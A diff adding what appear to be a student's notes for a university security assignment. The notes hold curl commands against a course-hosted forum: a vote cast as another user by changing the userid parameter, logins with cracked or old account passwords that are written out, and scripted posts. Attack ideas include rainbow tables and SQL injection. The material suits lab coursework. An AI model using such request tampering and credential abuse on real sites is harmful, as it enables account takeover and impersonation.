@@ -1,0 +1,54 @@
+1: 
+curl 'http://ugster19.student.cs.uwaterloo.ca/lajaneck/vote.php?userid=1&id=3&vote=1' 
+
+/*
+this sploit votes on a post as a user with the user id 1 while alice's user id is 7
+*/
+
+
+2:nasghar weERKDekj4
+
+curl -c cookies.txt 'http://ugster19.student.cs.uwaterloo.ca/lajaneck/post.php' --data 'username=nasghar&password=weERKDekj4&form=login&submit=Login'
+curl -b cookies.txt 'http://ugster19.student.cs.uwaterloo.ca/lajaneck/post.php'  --data 'title=Change+Your+Password&content=You+really+should+change+your+password+guy&type=1&form=content&submit=Post'
+
+/*
+* This sploit checks the oldPasswords.txt passwords
+*/
+
+
+
+3: bob joker555
+
+curl -c cookies.txt 'http://ugster19.student.cs.uwaterloo.ca/lajaneck/post.php' --data 'username=bob&password=joker555&form=login&submit=Login'
+curl -b cookies.txt 'http://ugster19.student.cs.uwaterloo.ca/lajaneck/post.php' --data 'title=Your+hash+is+bad+and+you+should+feel+bad&content=md5+...+sigh%3F&type=1&form=content&submit=Post'
+/*
+* find password hashes stored in db, use rainbow table to crack them
+*/
+
+
+
+
+
+4: guest, empty password
+
+
+
+ideas
+upvote url
+old passwords
+md5 rainbow tables
+sql injection in login
+
+
+
+
+
+//useful
+//login
+curl -c cookies.txt 'http://ugster19.student.cs.uwaterloo.ca/lajaneck/post.php' --data 'username=alice&password=passw0rd&form=login&submit=Login'
+//sample post
+curl -b cookies.txt 'http://ugster19.student.cs.uwaterloo.ca/lajaneck/post.php' --data 'title=test2&content=this+is+a+test&type=1&form=content&submit=Post'
+
+
+
+url http://ugster19.student.cs.uwaterloo.ca/lajaneck/
